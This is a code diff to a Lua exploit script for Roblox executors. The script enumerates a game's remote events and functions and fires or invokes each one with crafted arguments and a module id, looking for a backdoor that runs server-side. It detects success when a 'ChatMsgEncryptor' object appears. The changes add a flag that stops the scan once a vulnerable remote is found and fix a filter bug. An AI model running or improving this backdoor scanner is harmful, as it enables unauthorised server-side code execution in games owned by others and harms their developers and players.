@@ -99,9 +99,11 @@ end
 getgenv().excl = getgenv().excl or {}
 local lastrem = nil
 local remi = 0
+local isvulnfound = false
 game.ReplicatedStorage.ChildAdded:connect(function(r)
     if r.Name == "ChatMsgEncryptor" then
         print(lastrem:GetFullName().." vulnerable")
+        isvulnfound = true
         game.Players.LocalPlayer.Character:Destroy()
     end
 end)
@@ -109,7 +111,7 @@ local placeid = game.PlaceId
 local rems = {}
 for i,v in pairs(game:GetDescendants()) do
     if not (v.Parent == game:GetService("RobloxReplicatedStorage")) then
-        if v:IsA"RemoteEvent" or v:IsA"RemoteFunction" and not v.Name == "UpdateLabel" then
+        if v:IsA"RemoteEvent" or v:IsA"RemoteFunction" and not (v.Name == "UpdateLabel") then
             table.insert(rems, v)
         end
     end
@@ -161,6 +163,9 @@ for i,rem in pairs(rems) do
             rem:FireServer(v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent)
         end
         task.wait(.3)
+        if isvulnfound then
+            break
+        end
     end
     if rem:IsA"RemoteFunction" then
         for i,v in pairs(fakes) do
@@ -185,5 +190,8 @@ rem:InvokeServer(nil,nil,nil,moduleid)
 rem:InvokeServer(v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent)
         end
         task.wait(.3)
+        if isvulnfound then
+            break
+        end
     end
 end
